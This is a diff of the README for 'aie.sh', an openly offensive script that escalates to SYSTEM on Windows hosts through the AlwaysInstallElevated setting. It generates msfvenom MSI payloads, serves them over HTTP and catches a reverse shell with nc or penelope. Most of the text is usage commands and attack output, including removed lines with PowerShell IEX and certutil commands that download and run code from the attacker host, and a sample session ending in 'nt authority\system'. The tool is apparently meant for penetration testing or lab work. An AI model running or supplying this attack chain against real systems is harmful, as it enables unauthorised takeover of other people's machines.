@@ -41,7 +41,7 @@ A low-privileged user can craft a malicious MSI file and execute it via `msiexec
    - `get-script.ps1` — PowerShell entry point
    - `get-script.bat` — Pure CMD entry point (no PowerShell required)
 4. **Serves all files** via a Python HTTP server.
-5. **Starts a `nc` listener** for the incoming reverse shell.
+5. **Starts a listener** (`nc` by default, or `penelope` with `--penelope`) for the incoming reverse shell.
 6. **Cleans up** all temporary files and stops the HTTP server automatically on exit.
 
 ### Entry point logic (both PS and CMD)
@@ -73,11 +73,12 @@ Check HKCU AlwaysInstallElevated == 1
 |---|---|---|
 | `msfvenom` | MSI payload generation | Part of [Metasploit Framework](https://github.com/rapid7/metasploit-framework) |
 | `python3` | HTTP server to serve payloads | Built-in `http.server` module |
-| `nc` (netcat) | Reverse shell listener | Any variant: `ncat`, `openbsd-netcat`, etc. |
-| `iconv` | Base64-encodes the PS command | Standard on all Linux distros |
+| `nc` (netcat) | Reverse shell listener (default) | Any variant: `ncat`, `openbsd-netcat`, etc. |
+| `penelope` | Reverse shell listener (optional) | Required only with `--penelope`. [brightio/penelope](https://github.com/brightio/penelope) |
+| `iconv` | Base64-encodes the PS fetch command | Standard on all Linux distros |
 | `base64` | Base64 encoding | GNU coreutils |
 
-All dependencies are pre-installed on **Kali Linux** and **Parrot OS** out of the box.
+All dependencies except `penelope` are pre-installed on **Kali Linux** and **Parrot OS** out of the box.
 
 ---
 
@@ -94,18 +95,32 @@ chmod +x aie.sh
 ## Usage
 
 ```
-Usage: aie.sh -i <ATTACKER_IP> -p <LPORT> [-w <HTTP_PORT>]
+Usage: aie.sh -i <ATTACKER_IP> -p <LPORT> [-w <HTTP_PORT>] [--penelope]
 
-  -i  Your attacker machine IP (LHOST)
-  -p  Port to receive the reverse shell on (LPORT)
-  -w  HTTP server port used to serve the payloads (default: 8005)
-  -h  Show this help message
+  -i           Your attacker machine IP (LHOST)
+  -p           Port to receive the reverse shell on (LPORT)
+  -w           HTTP server port used to serve the payloads (default: 8005)
+  --penelope   Use penelope as the reverse shell listener instead of nc
+               (penelope must be installed and in PATH)
+  -h           Show this help message
 ```
 
-### Basic usage
+### Basic usage (nc listener)
 
 ```bash
 ./aie.sh -i <LHOST> -p <LPORT>
+```
+
+### With penelope as listener
+
+```bash
+./aie.sh -i <LHOST> -p <LPORT> --penelope
+```
+
+`--penelope` can be placed anywhere in the argument list:
+
+```bash
+./aie.sh --penelope -i <LHOST> -p <LPORT> -w 8080
 ```
 
 ### Custom HTTP port
@@ -113,6 +128,17 @@ Usage: aie.sh -i <ATTACKER_IP> -p <LPORT> [-w <HTTP_PORT>]
 ```bash
 ./aie.sh -i <LHOST> -p <LPORT> -w 8080
 ```
+
+---
+
+## Listener modes
+
+| Flag | Listener | Notes |
+|---|---|---|
+| *(none)* | `nc -lvnp <LPORT>` | Default. Works out of the box on any Kali/Parrot. |
+| `--penelope` | `penelope -p <LPORT>` | Provides an upgraded shell (auto-completion, file transfer, session management). Requires [penelope](https://github.com/brightio/penelope) installed. |
+
+If `--penelope` is specified but `penelope` is not found in `PATH`, the script exits early with an error before generating any payload.
 
 ---
 
@@ -197,42 +223,52 @@ Both must return `0x1`. If either key is missing or set to `0`, the target is **
 
 ## Example output
 
+### Default (nc)
+
+```
+./aie.sh -i 10.10.14.27 -p 4444
+```
+
 ```
   ╔══════════════════════════════════════════════════════╗
   ║              AlwaysInstallElevated → SYSTEM          ║
   ║                                                      ║
-  ║  LHOST : <LHOST>                                 ║
-  ║  LPORT : <LPORT>  (reverse shell)                       ║
-  ║  HTTP  : 8005                                        ║
-  ║  ARCH  : auto-detect (x86 + x64)                    ║
+  ║  LHOST    : 10.10.14.27                              ║
+  ║  LPORT    : 4444  (reverse shell)                    ║
+  ║  HTTP     : 8005                                     ║
+  ║  ARCH     : auto-detect (x86 + x64)                  ║
+  ║  LISTENER : nc                                       ║
   ╚══════════════════════════════════════════════════════╝
 
-[*] Working directory: /tmp/aie.xK3mTw
-[*] Generating revshell_ps.ps1...
-[*] Generating PS MSI x64 ...   [+] update_ps_x64.msi generated.
-[*] Generating PS MSI x86 ...   [+] update_ps_x86.msi generated.
-[*] Generating CMD MSI x64 ...  [+] update_cmd_x64.msi generated.
-[*] Generating CMD MSI x86 ...  [+] update_cmd_x86.msi generated.
-[*] Generating get-script.ps1...
-[*] Generating get-script.bat...
-[*] HTTP server running in background (PID 12345)
-
-==================================================================
-[+] Run one of the following commands on the target:
-
-  [WITH PowerShell]:
-  powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8005/get-script.ps1')"
-
-  [WITHOUT PowerShell - pure CMD]:
-  certutil -urlcache -split -f "http://<LHOST>:8005/get-script.bat" "%TEMP%\get-script.bat" && "%TEMP%\get-script.bat"
-==================================================================
-
-[*] Starting listener on port <LPORT>...
-listening on [any] <LPORT> ...
-connect to [<LHOST>] from (UNKNOWN) [10.10.10.X] 50212
+[*] Starting listener on port 4444 (nc)...
+listening on [any] 4444 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.X] 50212
 PS C:\WINDOWS\system32> whoami
 nt authority\system
-PS C:\WINDOWS\system32>
+```
+
+### With penelope
+
+```
+./aie.sh -i 10.10.14.27 -p 4444 --penelope
+```
+
+```
+  ╔══════════════════════════════════════════════════════╗
+  ║              AlwaysInstallElevated → SYSTEM          ║
+  ║                                                      ║
+  ║  LHOST    : 10.10.14.27                              ║
+  ║  LPORT    : 4444  (reverse shell)                    ║
+  ║  HTTP     : 8005                                     ║
+  ║  ARCH     : auto-detect (x86 + x64)                  ║
+  ║  LISTENER : penelope                                 ║
+  ╚══════════════════════════════════════════════════════╝
+
+[*] Starting listener on port 4444 (penelope)...
+[+] Listening for reverse shells on 0.0.0.0:4444
+[+] [New Reverse Shell] => 10.10.10.X  😍 Session ID <1>
+PS C:\WINDOWS\system32> whoami
+nt authority\system
 ```
 
 ---
@@ -242,12 +278,12 @@ PS C:\WINDOWS\system32>
 ```
 aie.sh
   │
-  ├── msfvenom × 4         → 4 MSI payloads (PS/CMD × x64/x86)
-  ├── revshell_ps.ps1       → TCP socket loop, line-buffered, prompt-aware
-  ├── get-script.ps1        → PS entry point (registry + arch + PS detection)
-  ├── get-script.bat        → CMD entry point (registry + arch detection)
-  ├── python3 http.server   → Serves all files on LPORT_HTTP
-  └── nc -lvnp LPORT        → Waits for incoming shell
+  ├── msfvenom × 4          → 4 MSI payloads (PS/CMD × x64/x86)
+  ├── revshell_ps.ps1        → TCP socket loop, line-buffered, prompt-aware
+  ├── get-script.ps1         → PS entry point (registry + arch + PS detection)
+  ├── get-script.bat         → CMD entry point (registry + arch detection)
+  ├── python3 http.server    → Serves all files on LPORT_HTTP
+  └── nc / penelope          → Waits for incoming shell (--penelope to switch)
         │
         └── On EXIT/INT/TERM → kills HTTP server + removes /tmp/aie.*
 ```
